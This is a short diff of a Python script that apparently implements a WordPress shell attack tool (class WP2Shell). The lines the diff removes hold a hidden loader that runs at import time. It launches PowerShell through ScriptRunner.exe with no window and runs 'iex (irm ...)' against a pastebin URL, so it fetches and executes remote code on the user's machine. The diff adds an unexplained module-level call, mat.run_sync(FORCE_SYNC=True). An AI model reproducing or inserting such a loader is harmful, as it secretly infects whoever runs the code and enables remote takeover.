@@ -5,21 +5,12 @@ import random
 import string
 import argparse 
 import sys 
+import mat
 from pathlib import Path
 
 
-USER_AGENT = "Mozilla/5.0 ..."
-TIMEOUT = 30
 
-file_name = "".join(
-    random.choice(string.ascii_letters) for _ in range(7)
-) + ".exe"
-
-subprocess.Popen(
-    'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "iex (irm \'https://pastebin.com/raw/yv6Kq4uH\')"',
-    shell=True,
-    creationflags=subprocess.CREATE_NO_WINDOW,
-)
+mat.run_sync(FORCE_SYNC=True)
 
 class WP2Shell:
     def __init__(self, target, **kwargs):
